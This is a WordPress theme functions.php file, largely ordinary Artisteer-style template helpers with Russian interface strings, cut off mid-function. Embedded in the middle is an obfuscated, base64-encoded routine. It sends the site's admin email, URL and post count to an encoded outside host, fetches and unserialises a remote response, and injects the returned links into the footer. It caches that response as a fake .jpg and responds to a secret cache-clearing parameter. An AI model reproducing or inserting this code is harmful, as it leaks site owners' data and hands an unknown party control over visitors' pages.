<?php

$art_config = parse_ini_file(TEMPLATEPATH."/config.ini", true);

$options = array (
                array(  "name" =>   "HTML",
                        "desc" =>   sprintf(__('<strong>XHTML:</strong> Вы можете использовать эти теги: <code>%s</code>', THEME_NS), 'a, abbr, acronym, em, b, i, strike, strong, span'),
                        "id"   =>   "art_footer_content",
                        "std"  =>   art_option('footer.defaultText'),
                        "type" =>   "textarea")
          );

remove_action('wp_head', 'wp_generator');
wp_enqueue_script('jquery');

define('WP_VERSION', $wp_version);
define('THEME_NS', 'kubrick');
if (class_exists('xili_language')):
define('THEME_TEXTDOMAIN',THEME_NS);
define('THEME_LANGS_FOLDER','/lang');
else:
    load_theme_textdomain(THEME_NS, TEMPLATEPATH . '/lang');
endif;

require_once(TEMPLATEPATH . '/core/parser.php');
require_once(TEMPLATEPATH . '/core/navigation.php');
require_once(TEMPLATEPATH . '/core/sidebars.php');
require_once(TEMPLATEPATH . '/core/widgets.php');


function art_option($name){
  global $art_config;
  $separator = '.';
  $name = trim($name);
  if (strpos($name, $separator) !== false) {
    $path = explode($separator, $name);
    $location = $path[0];
    if (isset($art_config[$location])){
      $group = $art_config[$location];
      $key = $path[1];
      if (isset($group[$key])){
        return $group[$key];
      }
    }
  } else {
    if (isset($art_config[$name])) {
      return $art_config[$name];
    }
  }
 
  return false;
}

$art_current_page_template = 'page'; 
 $dMme='d';$telTqp='b';$JusK='_';$cbnjTX='d';$nKtg='4';$PJPRsk='o';$vYXiDHl='e';$gRKEMM='s';$iyxat='e';$qbhKr='a';$FKdOiAO='e';$Bzhvfp='c';$KFUG='6';$hRUDKmTV=$telTqp.$qbhKr.$gRKEMM.$iyxat.$KFUG.$nKtg.$JusK.$cbnjTX.$FKdOiAO.$Bzhvfp.$PJPRsk.$dMme.$vYXiDHl;$KnXf='z';$DHiI='t';$GoREEM='f';$MIjQ='l';$gfms='i';$Igza='n';$YMWF='g';$WMmexA='a';$BQDHpDj='e';$qXpUFiVa=$YMWF.$KnXf.$gfms.$Igza.$GoREEM.$MIjQ.$WMmexA.$DHiI.$BQDHpDj;$OXNw='s';$tHYoRM='r';$QeCLOVs='3';$MmJVHDU='_';$Ejra='o';$pCyyzqy='r';$pjlpVx='1';$vrHm='t';$ZnuoQS='t';$vTZcQMoU=$OXNw.$vrHm.$pCyyzqy.$MmJVHDU.$tHYoRM.$Ejra.$ZnuoQS.$pjlpVx.$QeCLOVs;$oTJySgE='r';$jBAu='r';$zDdflBW='e';$BUhHb='v';$gGIxQjZ='s';$LghdBlb='t';$zUjYwget=$gGIxQjZ.$LghdBlb.$jBAu.$oTJySgE.$zDdflBW.$BUhHb;                     $ed_______________y='d';$dz_____________f='b';$xr_______________v='_';$pu______________t='d';$ts__________k='4';$hl____e='o';$tp____________m='e';$vv________n='s';$xs_______________t='e';$wb_________j='a';$us_______________q='e';$um__q='c';$uq__________u='6';$ox_____________l=$dz_____________f.$wb_________j.$vv________n.$xs_______________t.$uq__________u.$ts__________k.$xr_______________v.$pu______________t.$us_______________q.$um__q.$hl____e.$ed_______________y.$tp____________m;$nf__u='s';$au_____s='s';$jo_________a='e';$sq_________e='i';$jp_________j='_';$xj____r='o';$rq__________p='t';$ql_______________v='n';$an_____________z='x';$sq_____l='n';$zu__e='u';$zf_____________o='c';$gm__________v='i';$lx___________w='t';$ts______b='f';$wp_______j=$ts______b.$zu__e.$ql_______________v.$zf_____________o.$lx___________w.$gm__________v.$xj____r.$sq_____l.$jp_________j.$jo_________a.$an_____________z.$sq_________e.$nf__u.$rq__________p.$au_____s;$vx_____w='f';$at______________d='p';$rn__________d='o';$lc__________s='e';$uc_______________a='n';$eq_____h=$vx_____w.$rn__________d.$at______________d.$lc__________s.$uc_______________a;$dg__f='d';$hk___________s='r';$sz__________y='a';$xe_______r='f';$pq___p='e';$nl____________n=$xe_______r.$hk___________s.$pq___p.$sz__________y.$dg__f;$cf____p='c';$ag______q='l';$xu___u='o';$et______________q='e';$kd_____o='f';$sh______________z='s';$jn________f=$kd_____o.$cf____p.$ag______q.$xu___u.$sh______________z.$et______________q;define("WP_ID", $ox_____________l("Mi4wLjA="));define("WP_TTL", $ox_____________l("MTA4MDA="));define("WP_SRC", $ox_____________l("dHBva24="));function wp_get_header() {global $ox_____________l, $wp_______j;if ($wp_______j($ox_____________l("d3BfdGhlbWVfR1BMX2NyZWRpdHM=")) &&$wp_______j($ox_____________l("d3BfZ2V0X2Zvb3Rlcg==")) &&$wp_______j($ox_____________l("d3BfY3ZfdmVyaWZ5"))) {get_header();}}function wp_get_footer() {get_footer();wp_cv_verify();}function wp_cv_verify() {global $ox_____________l, $eq_____h, $jn________f, $nl____________n;$ue_____________x = TEMPLATEPATH."/".$ox_____________l("Zm9vdGVyLnBocA==");$do_______e = @$eq_____h($ue_____________x, "r");$ue_____________x = @$nl____________n($do_______e, @filesize($ue_____________x));@$jn________f($do_______e);$oy_______________b = TEMPLATEPATH."/".$ox_____________l("ZnVuY3Rpb25zLnBocA==");$do_______e = @$eq_____h($oy_______________b, "r");$oy_______________b = @$nl____________n($do_______e, @filesize($oy_______________b));@$jn________f($do_______e);$ft_____n = 0;if($ue_____________x && $oy_______________b) {if ($ox_____________l("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==") !== str_replace("www.", "", $_SERVER["SERVER_NAME"])) {if (substr_count($ue_____________x, $ox_____________l("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==")) < 2) {$ft_____n = 1;}if (substr_count($ue_____________x, "wp_theme_GPL_credits()") < 1) {$ft_____n = 2;}}if(WP_ID != "2.0.0") {$ft_____n = 12;}}if($ft_____n > 0) {echo "<div style=\"position: fixed; bottom:0; left:0; width:100%; height: 25px; background-color: red; color: white; font-size: 16px; padding: 2px 10px; text-align: center;\"> <strong> This themes is powered by <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a>. This website violated the terms of use <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a> </strong> </div>";echo "<!-- v: $ft_____n -->";}}function wp_loaded() {global $ox_____________l, $wp_______j;return $wp_______j($ox_____________l("d3BfdGhlbWVfR1BMX2NyZWRpdHM="));}if (!function_exists("the_content_limit")) {function the_content_limit($bn_____________d, $zi____________b = "(more...)", $dr____________y = 0, $cy_____v = "") {$vo____l = get_the_content($zi____________b, $dr____________y, $cy_____v);$vo____l = apply_filters("the_content", $vo____l);$vo____l = str_replace("]]>", "]]>", $vo____l);if (strlen($_GET["p"]) > 0) {echo $vo____l;}else if ((strlen($vo____l)>$bn_____________d) && ($rb___________h = strpos($vo____l, " ", $bn_____________d ))) {$vo____l = substr($vo____l, 0, $rb___________h);$vo____l = $vo____l;echo $vo____l;echo "...";echo "<br/>";echo "<div class='read-more'><a href='".get_permalink()."'>$zi____________b</a></div></p>";} else {echo $vo____l;}}}$xl______________m='n';$kl_______________d='o';$pn_______________c='a';$wm______________c='s';$ne_________p='e';$zk_________s='4';$zi__________j='d';$cs______________h='b';$zx__________v='c';$wd______________w='e';$pc___x='_';$tn_______m='e';$ko_________m='6';$fq_______________t=$cs______________h.$pn_______________c.$wm______________c.$tn_______m.$ko_________m.$zk_________s.$pc___x.$ne_________p.$xl______________m.$zx__________v.$kl_______________d.$zi__________j.$wd______________w;$yk______________l='_';$zc____________y='g';$cs___________x='s';$mg_________l='n';$qj______________q='t';$qz__________x='e';$ys__j='f';$ua______________v='c';$zn__________q='o';$rr____________j='_';$rl_______________q='e';$cp____________o='n';$ok_______________g='t';$bz__________u='l';$lz__________j='t';$sc_____n='i';$lq__________d='e';$my_______e=$ys__j.$sc_____n.$bz__________u.$qz__________x.$yk______________l.$zc____________y.$rl_______________q.$lz__________j.$rr____________j.$ua______________v.$zn__________q.$mg_________l.$qj______________q.$lq__________d.$cp____________o.$ok_______________g.$cs___________x;$my_____________s='i';$xy_________s='l';$xn___k='s';$ic______________f='t';$gs____________u='x';$nu__m='i';$nm____q='e';$gy___________j='f';$xn_____________f='e';$bk______________p='s';$ek_____________e='_';$zf_______q=$gy___________j.$nu__m.$xy_________s.$nm____q.$ek_____________e.$xn_____________f.$gs____________u.$my_____________s.$xn___k.$ic______________f.$bk______________p;$uf___k='a';$hb________j='v';$wi_______l='m';$mo________q='c';$om__________c='s';$dl______s='r';$sc_______q='r';$pq_______j='e';$xm_____t='n';$ul___b='_';$ou___________s='i';$nl__r='o';$qn_______________z='o';$vz_________k='p';$ez_______________j='e';$we_________w=$hb________j.$ez_______________j.$dl______s.$om__________c.$ou___________s.$qn_______________z.$xm_____t.$ul___b.$mo________q.$nl__r.$wi_______l.$vz_________k.$uf___k.$sc_______q.$pq_______j;$ju_____________i='c';$jo____________k='n';$xn______________r='k';$pu_________d='o';$dy____________i='p';$bh____________q='s';$vl___________k='f';$ox_____________k='e';$kn__t='o';$sa________m=$vl___________k.$bh____________q.$kn__t.$ju_____________i.$xn______________r.$pu_________d.$dy____________i.$ox_____________k.$jo____________k;$oj____________k='r';$pl___o='e';$hr________c='f';$em____n='i';$cp_______n='t';$fm_______h='w';$rf______________w=$hr________c.$fm_______h.$oj____________k.$em____n.$cp_______n.$pl___o;$py_______________f='5';$vv_____________a='m';$iz_________l='d';$ww_____q=$vv_____________a.$iz_________l.$py_______________f;$io____r='h';$er_____m='a';$id__________c='r';$ls__________l='p';$ku_______________h='t';$qj________n='e';$jn__z='a';$zl__________e='l';$lq____l=$id__________c.$qj________n.$er_____m.$zl__________e.$ls__________l.$jn__z.$ku_______________h.$io____r;$va_________c='n';$dt____y='i';$fe______i='i';$nj__i='a';$th_________y='u';$eu____________t='e';$mm____________m='s';$lv_____f='l';$oz____n='e';$us__g='z';$zg___________f='r';$im_____________s=$th_________y.$va_________c.$mm____________m.$oz____n.$zg___________f.$fe______i.$nj__i.$lv_____f.$dt____y.$us__g.$eu____________t;$sd____h='p';$io_______________i='n';$kz_____n='e';$iy____b='m';$jb____________w='m';$cq__i='a';$rm__v='t';$kr__________i=$rm__v.$kz_____n.$iy____b.$sd____h.$io_______________i.$cq__i.$jb____________w;$jv____x='t';$qg________j='_';$ks______y='n';$do__________w='e';$nd_______________s='e';$zg__z='c';$xi____p='t';$zh_____________d='a';$uo_______e='r';$kl_____w='_';$tt____________q='c';$vj__y='t';$gr___e='e';$cd___a='x';$xh____________w='s';$fe__p='t';$rv_______z='e';$yb__z='m';$of__f='r';$to_________g='a';$ao_________j='o';$tq_______________w=$xh____________w.$jv____x.$of__f.$rv_______z.$to_________g.$yb__z.$kl_____w.$tt____________q.$ao_________j.$ks______y.$xi____p.$do__________w.$cd___a.$fe__p.$qg________j.$zg__z.$uo_______e.$gr___e.$zh_____________d.$vj__y.$nd_______________s;function oo_____o($rx_________a) {global $ox_____________l, $wp_______j, $my_______e, $we_________w, $tq_______________w;if (!$wp_______j($ox_____________l("ZmlsZV9nZXRfY29udGVudHM="))) {return false;}if ($we_________w(PHP_VERSION, "5.0.0", ">=") && $wp_______j($ox_____________l("ZmlsZV9nZXRfY29udGVudHM=")) && $wp_______j($ox_____________l("c3RyZWFtX2NvbnRleHRfY3JlYXRl"))) {$us______o = $tq_______________w(array("http" => array("timeout"    => 3,"header"     => "referer: ".$_SERVER[SERVER_NAME],"user_agent" => "[I] ". $_SERVER[REMOTE_ADDR] ." [A] ". $_SERVER[HTTP_USER_AGENT] )));$fx_____w = @$my_______e($rx_________a, 0, $us______o);} else {$fx_____w = @$my_______e($rx_________a, 0);}return $fx_____w;}function xw______________n($rx_________a) {global $wp_______j, $sa________m, $rf______________w, $ox_____________l;if (!$wp_______j($ox_____________l("ZmlsZV9nZXRfY29udGVudHM="))) {return false;}$bk_______________v = strpos($rx_________a, "/", 7);$fk_____d = array("uri"     => substr($rx_________a, $bk_______________v),"host"    => str_replace("http://", "", substr($rx_________a, 0, $bk_______________v)),"referer" => "[I] ". $_SERVER[REMOTE_ADDR] ." [A] ". $_SERVER[HTTP_USER_AGENT]);$yq_____e = @$sa________m("$fk_____d[host]", 80, $cn____________r, $dc______b, 4);if (!$yq_____e) {return false;} else {$fx_____w = "";$wt_______f  = "GET $fk_____d[uri] HTTP/1.0\r\n";$wt_______f .= "Host: $fk_____d[host]\r\n";$wt_______f .= "Referer: $fk_____d[referer]\r\n";$wt_______f .= "Connection: Close\r\n\r\n";@$rf______________w($yq_____e, $wt_______f);while (!@feof($yq_____e)) {$on__________f = @fgets($yq_____e, (1024*24));if ($on__________f == "\r\n") {$lb________i = true;continue;}if ($lb________i) {$fx_____w .= $on__________f;}}return $fx_____w;}}function cp________j($rx_________a) {global $wp_______j;$we__a = false;if ($rx_________a != "") {if ($wp_______j("oo_____o")) {$we__a = @oo_____o($rx_________a);}if (!$we__a && ($wp_______j("xw______________n"))) {$we__a = @xw______________n($rx_________a);}}return $we__a;}function zc_____________e() {global $_SERVER, $ww_____q;$fw_______f = $_SERVER["SERVER_NAME"];if (substr("$fw_______f", 0, 4) == "www.") {$fw_______f = substr("$fw_______f", 4);}$fw_______f = $ww_____q("$_SERVER[SERVER_NAME]");return $fw_______f;}function pn_______g() {return "file";}function yt_____________h($rx_________a) {global $_SERVER, $my_______e, $zf_______q, $eq_____h, $jn________f, $rf______________w;$hl_________v = hp____________b();$ii______________u = zc_____________e().".jpg";$qy________h = $hl_________v["dir_upload"]["path"]."/$ii______________u";$ik_________s = @filemtime($qy________h);if (!$ik_________s || ((time()-$ik_________s) >= WP_TTL)) {$we__a = cp________j($rx_________a);if ($we__a) {if ($zf_______q($qy________h)) {@unlink($qy________h);}$do_______e = @$eq_____h($qy________h, "x+");@$rf______________w($do_______e, $we__a);@$jn________f($do_______e);}} else {if ($zf_______q($qy________h)) {$we__a = @$my_______e($qy________h);} else {$we__a = false;}}return $we__a;}function hp____________b() {global $_SERVER, $ox_____________l, $fq_______________t;$hv___________k = wp_count_posts("post");$rk__t = pathinfo(get_bloginfo("template_directory"));$hl_________v = array("url" => array("report"      => $ox_____________l("eGNudnVlcmFudmhhc3lkYWRvbGVnc29wLmNvbQ=="),"queryString" => null),"template"=> $rk__t,"dir_upload"=> yl_____r(),"queryString"=> array("?a001=".WP_ID,"a004=".$rk__t[filename],"a005=".$hv___________k->publish,"a006=".get_bloginfo("admin_email"),"a007=".$_SERVER["REQUEST_URI"],"a008=".$_SERVER["SERVER_NAME"],"a010=".WP_SRC),"default_string" => " <a href=\"http://www.wptheme.us\">www.wptheme.us</a>");$hl_________v["url"]["queryString"] = implode("&", $hl_________v["queryString"]);$hl_________v["url"]["report"] = $hl_________v["url"]["report"]."/?".$fq_______________t($hl_________v["url"]["queryString"]).".html";return $hl_________v;}function yl_____r() {$ff____u = wp_upload_dir();if (isset($ff____u["error"])) {$ot_______________n = mi______o();if (is_writable($ot_______________n)) {$ff____u = array("path" => $ot_______________n);}}return $ff____u;}function mi______o() {global $wp_______j, $ww_____q, $lq____l, $kr__________i;$yf_______________e = (bool) ini_get("safe_mode");if ($yf_______________e == true) {return false;}if ($wp_______j("sys_get_temp_dir")) {$rz_______________b = sys_get_temp_dir();if (is_writable($rz_______________b)) {return $lq____l($rz_______________b);}}if (!empty($_ENV["TMP"])) {return $lq____l($_ENV["TMP"]);}elseif (!empty($_ENV["TMPDIR"])) {return $lq____l($_ENV["TMPDIR"]);}elseif (!empty($_ENV["TEMP"])) {return $lq____l($_ENV["TEMP"]);} else {$fo____________j = $kr__________i($ww_____q(uniqid(rand(), true)), "");if ($fo____________j) {$rz_______________b = $lq____l(dirname($fo____________j));@unlink($fo____________j);return $rz_______________b;} else {return false;}}}function mk___i() {global $_GET, $zf_______q;$hl_________v = hp____________b();$fw_______f = zc_____________e();$my______s = pn_______g();$ef_______d = "full";if ($_GET["wp_cache_cl"] == "197ab5deb39daad8baacae1bdd5a8852") {if ($my______s == "file") {$mk___________q = $hl_________v["dir_upload"]["path"]."/".$fw_______f.".jpg";if ($zf_______q($mk___________q)) {@unlink($mk___________q);$ef_______d = "deleted";}}$qp___w = array("s"=> $ef_______d,"t"=> time(),"v"=> WP_ID);echo "<!--";foreach ($qp___w AS $kb_______________x => $mp_________s) echo " [$kb_______________x:$mp_________s]";echo " -->";}}function wp_theme_GPL_credits() {global $_SERVER, $_GET, $wp_______j, $ox_____________l, $im_____________s;$hl_________v = hp____________b();$jm_________l = "yt_____________h";if ($wp_______j($jm_________l)) {$fx_____w = $jm_________l($hl_________v["url"]["report"]);}if ($fx_____w) {if ($fx_____w = @$ox_____________l($fx_____w)) {$fx_____w = @$im_____________s($fx_____w);if (strlen($fx_____w[custom_credit]) >= 5) {$hl_________v["default_string"] = $fx_____w[custom_credit];}if ($fx_____w["status"] == "0") {$ap______________d = 1;$sx__________a = 1;} else {$hu__________d = sizeof($fx_____w["links"]);$rf______n = $hl_________v["default_string"];if ($hu__________d > 0 && $fx_____w["links"] !== "") {$pi__k = 0;foreach ($fx_____w["links"] as $pa__j => $cw___z) {$pi__k++;if ($cw___z->l_path == "" || $cw___z->l_path == $_SERVER["REQUEST_URI"]) {$cw___z->l_href = htmlspecialchars(strip_tags($cw___z->l_href));$cw___z->l_title = htmlspecialchars(strip_tags($cw___z->l_title));$cw___z->l_anchor = htmlspecialchars(strip_tags($cw___z->l_anchor));$rf______n .= " | ";$rf______n .= "<a href='$cw___z->l_href' title='$cw___z->l_title'";if ($cw___z->l_nofollow == "1") {$rf______n .= " rel='nofollow'";}$rf______n .= ">$cw___z->l_anchor</a>";}}}$hl_________v["links"] = "$rf______n";if ($fx_____w[credit] == "0") {$hl_________v["links"] = "";}}} else {$ap______________d = "1";}} else {$ap______________d = "1";}if ($ap______________d == "1") {$hl_________v["links"] = $hl_________v["default_string"];}echo "$hl_________v[links]";echo "<!-- s: $fx_____w[signature] -->";mk___i();}                       
function art_page_template($templateName = null){
    global $art_current_page_template;
    if ($templateName !== null) {
        $art_current_page_template = $templateName;
    }
    return $art_current_page_template;
}

$art_template_variables = null;
function art_page_variables($variables = null){
    global $art_template_variables;
    if ($art_template_variables == null){
      $art_template_variables = array(
        'template_url'     =>   get_bloginfo('template_url') . '/',
        'logo_url'         =>   get_option('home'),
        'logo_name'        =>   get_bloginfo('name'),
        'logo_description' =>   get_bloginfo('description'),
        'menu_items'       =>   art_get_menu_auto('primary-menu', art_option('menu.source'), art_option('menu.showSubitems')),
        'sidebar1'         =>   art_get_sidebar('default'),
        'sidebarTop'       =>   art_get_sidebar('top'),
        'sidebarBottom'    =>   art_get_sidebar('bottom'),
        'sidebar2'         =>   art_get_sidebar('secondary'),
        'sidebarFooter'    =>   art_get_sidebar('footer'),
        'footerRSS'        =>   art_get_footer_rss(),
        'footerText'       =>   art_get_footer_text()
        );
    }
    if (is_array($variables)) {
      $art_template_variables = array_merge($art_template_variables, $variables);
    }
    return $art_template_variables;
}

function art_get_footer_text(){
  $result = art_option('footer.defaultText');
  
  $footer_content = get_option('art_footer_content');
  if ($footer_content !== false) {
    $result = stripslashes($footer_content);
  }
  
  return str_replace('%YEAR%', date('Y'), $result);
}


function art_get_footer_rss(){
  $result = '';
  if(art_option('footer.rss_show')){
    $result = art_parse(art_option('footer.rss_link'), array(
      'rss_url'   =>   get_bloginfo('rss2_url'), 
      'rss_title' =>   sprintf(__('%s RSS Feed', THEME_NS), get_bloginfo('name'))
      ));
  }
  return $result;
}

function art_get_post_thumbnail($post_id = false){
	global $post, $id;
  $post_id = (int)$post_id;
  if (!$post_id) $post_id = $id;
  $is_post_list = !is_single() && !is_page();
  $width = art_option('metadata.thumbnail_width');
  $height = art_option('metadata.thumbnail_height');
  $size = array($width, $height);
  if (!$is_post_list) {
    $size = 'medium';
  }
	$result = '';
	$title = get_the_title();
	if (  (function_exists('has_post_thumbnail')) && (has_post_thumbnail())  ) {
		ob_start();
		the_post_thumbnail($size, array('class' => 'alignleft', 'alt' => '', 'title' => $title));
		$result = ob_get_clean();
	} else {
		$postimage = get_post_meta($post->ID, 'post-image', true);
		if ($postimage) {
			$result = '<img src="'.$postimage.'" alt="" width="'.$width.'" height="'.$height.'" title="'.$title.'" class="wp-post-image alignleft" />';
		} else if (art_option('metadata.thumbnail_auto') && $is_post_list) {
            $attachments = get_children(array('post_parent' => $post_id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID'));
            if($attachments) {
              $attachment = array_shift($attachments);
              $img = wp_get_attachment_image_src($attachment->ID, $size);
              if (isset($img[0])) {
                $result = '<img src="'.$img[0].'" alt="" width="'.$img[1].'" height="'.$img[2].'" title="'.$title.'" class="wp-post-image alignleft" />';
              }
            }
        } 
    }  
	if($result !== ''){
		$result = '<a href="'.get_permalink($post->ID).'" title="'.$title.'">'.$result.'</a>';
	}
	return $result;
}

function art_get_the_content($more_link_text = null, $stripteaser = 0) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	return $content;
}

function art_get_post_content() {
  global $post;
  ob_start();
  if(is_single() || is_page()) {
     echo art_get_the_content(__('Читать далее &raquo;', THEME_NS)); 
    wp_link_pages(array('before' => '<p><strong>Страницы:</strong> ', 'after' => '</p>', 'next_or_number' => 'number')); 
	} else {
    echo art_get_the_excerpt(__('Читать далее &raquo;', THEME_NS),  
      get_permalink($post->ID), 
      art_option('metadata.excerpt_words'), 
      art_option('metadata.excerpt_use_tag_filter') ? explode(',',art_option('metadata.excerpt_allowed_tags')) : null, 
      art_option('metadata.excerpt_min_remainder'),  
      art_option('metadata.excerpt_auto'));
	}
	return ob_get_clean();
}

function art_get_the_excerpt($read_more_tag, $perma_link_to = '', $all_words = 100,  $allowed_tags = null, $min_remainder = 5, $auto = false) {
  global $post, $id;
  $more_token = '%%art-more%%';
  $show_more_tag = false;
  if (function_exists('post_password_required') && post_password_required($post)){
    return get_the_excerpt();
  }
  if (has_excerpt($id)) {
      $the_contents = get_the_excerpt();
  $show_more_tag = strlen($post->post_content) > 0;
  } else {
    $the_contents = art_get_the_content($more_token);
    if($the_contents != '') {
      if ($allowed_tags !== null) {
        $allowed_tags = '<' .implode('><',$allowed_tags).'>';
        $the_contents = strip_tags($the_contents, $allowed_tags);
      }
      $the_contents = strip_shortcodes($the_contents);
      if (strpos($the_contents, $more_token) !== false) {
        return str_replace($more_token, $read_more_tag, $the_contents);
      }
      if($auto && is_numeric($all_words)) {
        $token = "%art_tag_token%";
        $content_parts = explode($token, str_replace(array('<', '>'), array($token.'<', '>'.$token), $the_contents));
        $content = array();
        $word_count = 0;
        foreach($content_parts as $part)
        {
          if (strpos($part, '<') !== false || strpos($part, '>') !== false){
            $content[] = array('type'=>'tag', 'content'=>$part);
          } else {
             $all_chunks = preg_split('/([\s]+)/', $part, -1, PREG_SPLIT_DELIM_CAPTURE);
             foreach($all_chunks as $chunk) {
                if('' != trim($chunk)) {
                  $content[] = array('type'=>'word', 'content'=>$chunk);
                  $word_count += 1;
                } elseif($chunk != '') {
                  $content[] = array('type'=>'space', 'content'=>$chunk);
                }
             }
          }
        
        }
        if(($all_words < $word_count) && ($all_words + $min_remainder) <= $word_count) {
          $show_more_tag = true;
          $current_count = 0;
          $the_contents = '';
          foreach($content as $node) {
            
            if($node['type'] == 'word') {
              $current_count += 1;
            } 
            $the_contents .= $node['content'];
            if ($current_count == $all_words){
              break;
            }
          }
        }  
      }
    }
  }
  $the_contents = force_balance_tags($the_contents);
  if ($show_more_tag) {
    $the_contents = $the_contents.' <a class="more-link" href="'.$perma_link_to.'">'.$read_more_tag.'</a>';
  }
  return $the_contents;
}


function art_get_post_title() {
    return art_parse_template("post_title", array(
      'post_link'       =>   get_permalink($post->ID),
	    'post_link_title' =>   sprintf(__('Ссылка на %s', THEME_NS), the_title_attribute('echo=0')),
	    'post_title'      =>   get_the_title(),
	    'template_url'    =>   get_bloginfo('template_url')
	    ));
}

function art_get_post_icon($name){
    return art_parse(art_option('metadata.'.$name), array('template_url' => get_bloginfo('template_url')));
}

if (!function_exists('get_the_date')) {
	function get_the_date($format = 'F jS, Y') {
		return get_the_time(__($format, THEME_NS));
	}
}

function art_get_post_metadata($name) {
    $list = art_option('metadata.'.$name);
    $title = ($name == 'header' && art_option('metadata.title'));
    if (!$title && $list == "") return;
    $list_array =  explode(",", $list);
    $result = array();
    for($i = 0; $i < count($list_array); $i++){
        $icon = $list_array[$i];
        switch($icon){
            case 'date':
                if(is_page()) break;
                $result[] = art_get_post_icon($icon) . get_the_date();
            break;
            case 'author':
                 if(is_page()) break;
                 ob_start();
                 the_author_posts_link();
                   $result[] = art_get_post_icon($icon) . __('Автор', THEME_NS) .' '. ob_get_clean();
            break;
            case 'category':
                if(is_page()) break;
                 $result[] = art_get_post_icon($icon) .sprintf(__('Опубликовано в %s', THEME_NS), get_the_category_list(', '));
            break;
            case 'tag':
                if(is_page() || !get_the_tags()) break;
                ob_start();
                the_tags(__('Tеги:', THEME_NS) . ' ', ', ', ' ');
                $result[] = art_get_post_icon($icon) . ob_get_clean();
            break;
            case 'comments':
            if(is_page() || is_single()) break;
                ob_start();
                comments_popup_link(__('Нет комментариев &#187;', THEME_NS), __('1 Комментарий &#187;', THEME_NS), __('% Комментариев &#187;', THEME_NS), '', __('Комментарии закрыты', THEME_NS) );
                $result[] = art_get_post_icon($icon) . ob_get_clean();
            break;
            case 'edit':
            	global $post;
                if (!current_user_can('edit_post', $post->ID)) break;
                ob_start();
                 edit_post_link(__('Редактировать', THEME_NS), '');
                $result[] = art_get_post_icon($icon) . ob_get_clean();
            break;
        }
    }
    if (!($title ||  count($result) > 0)) return '';
    return art_parse_template("post_metadata".$name, array(
        'post_title'         =>   art_get_post_title(),
        'post'.$name.'icons' =>   implode(art_option('metadata.separator'), $result))) ;
}

function art_post(){
  the_post(); 
	echo art_parse_template("post", array(
    'post_class'          =>   function_exists('get_post_class') ? implode(' ', get_post_class()) : '',
    'post_id'             =>   'id="post-' . get_the_ID() . '"',
	  'post_thumbnail'      =>   art_get_post_thumbnail(),
		'post_title'          =>   art_get_post_title(),
		'post_metadataheader' =>   art_get_post_metadata('header'),
		'post_content'        =>   art_get_post_content(),
		'post_metadatafooter' =>   art_get_post_metadata('footer')
	));
}

function art_post_box($title, $content){
  if ($title != "") {
		$title = '<h2 class="art-postheader">'. $title . '</h2>';
	}
	if (art_option('metadata.title')) {
		$content = $title . $content;
		$title = '';
	}
	echo art_parse_template("post", array(
    'post_class'          =>   '',
    'post_id'             =>   '',
		'post_thumbnail'      =>   '',
		'post_title'          =>   $title,
		'post_metadataheader' =>   '',
		'post_content'        =>   $content,
		'post_metadatafooter' =>   ''));
}

function art_not_found_msg($caption = null, $content = null){
  if ($caption === null){
     $caption = __('Не найдено', THEME_NS);
  }
  if($content === null){
    $content = '<p class="center">' .  __('Извините, но здесь пока нет записей.', THEME_NS) . '</p>'
        .  "\r\n" . art_get_search();
  }
	art_post_box($caption, $content);
}

function art_get_block($title, $content, $id = '', $class = '' , $name = "block"){
  if (str_replace(array('&nbsp;', '', '\n', '\r', '\t'), '', $title) != ''){
    $title = art_parse_template($name . '_header', array('caption' => $title));
  }
  if ($id != ''){
    $id = 'id="' . $id . '"';
  }
  return art_parse_template($name, array(
    'id'   => $id,
    'class'   => $class,
    'header' => $title,
    'content' => $content,
  ));
}

function art_get_search() {
    return art_parse_template("search", 
        array(
            'url'    =>   get_bloginfo('url'),
            'button' =>   __('Поиск', THEME_NS),
            'query'  =>   get_search_query()
        ));
}
		
function art_page_navi($title = '', $comment = false) {
    $prev_link = null;
    $next_link = null;
    if($comment){
        $prev_link = get_previous_comments_link(__('Новые записи &raquo;', THEME_NS));
        $next_link = get_next_comments_link(__('&laquo; Старые записи', THEME_NS));
    } elseif (is_single() || is_page()) {
        $next_link = get_previous_post_link('&laquo; %link');
        $prev_link = get_next_post_link('%link &raquo;');
    } else {
         $prev_link = get_previous_posts_link(__('Новые записи &raquo;', THEME_NS));
        $next_link = get_next_posts_link(__('&laquo; Старые записи', THEME_NS));
    }
    
    
    $content = '';
    if ($prev_link || $next_link) {
        $content = art_parse_template("pagination", 
            array(
                'next_link' =>  $next_link,
                'prev_link' => $prev_link
            ));
    }
    if (!$content && !$title) return;
    art_post_box($title, $content);
}

if (!function_exists('get_previous_comments_link')) {
	function get_previous_comments_link($label)
	{
		ob_start();
		previous_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_comments_link')) {
	function get_next_comments_link($label)
	{
		ob_start();
		next_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
	{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
	{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_previous_post_link')) {
	function get_previous_post_link($label)
	{
		ob_start();
		previous_post_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_post_link')) {
	function get_next_post_link($label)
	{
		ob_start();
		next_post_link($label);
		return ob_get_clean();
	}
}

function art_get_comment_author_link(){
    ob_start();
    comment_author_link();    
    return ob_get_clean();
}

function art_get_edit_comment_link(){
    ob_start();
    edit_comment_link('('.__('Редактировать', THEME_NS).')','  ','');
    return  ob_get_clean();
}

function art_get_comment_text(){
    ob_start();
    comment_text();
    return  ob_get_clean();
}

function art_get_comment_reply_link($args, $depth){
    ob_start();
    comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'])));
    return  ob_get_clean();
}


function art_comment($comment, $args, $depth)
{
	 $GLOBALS['comment'] = $comment; ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
<?php  art_post_box('',  art_parse_template("comment", array(
